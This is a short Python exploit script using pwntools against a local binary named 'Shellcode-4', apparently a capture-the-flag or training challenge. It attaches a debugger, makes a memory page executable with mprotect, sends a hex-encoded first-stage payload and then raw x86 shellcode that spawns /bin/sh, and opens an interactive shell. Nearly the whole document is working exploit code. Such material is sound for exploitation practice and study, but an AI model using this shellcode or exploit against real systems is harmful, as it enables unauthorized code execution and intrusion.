from pwn import *

p = process('./Shellcode-4')
exe = ELF('./Shellcode-4', checksec=False)
def GDB():
    gdb.attach(p, gdbscript='''
        init-pwndbg
        b main
        call (int)mprotect(0x804a000, 0x1000, 7)
        c
    ''')

GDB()
input('wait')
p.sendafter(b'cd 80\n', b'31DB688CA004085931D2B60131C083C00331F681C68AA004088B3E81F778563412812EB5D63412013E90b5d63412')

shellcode2 = b"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

p.send(shellcode2)

p.interactive()
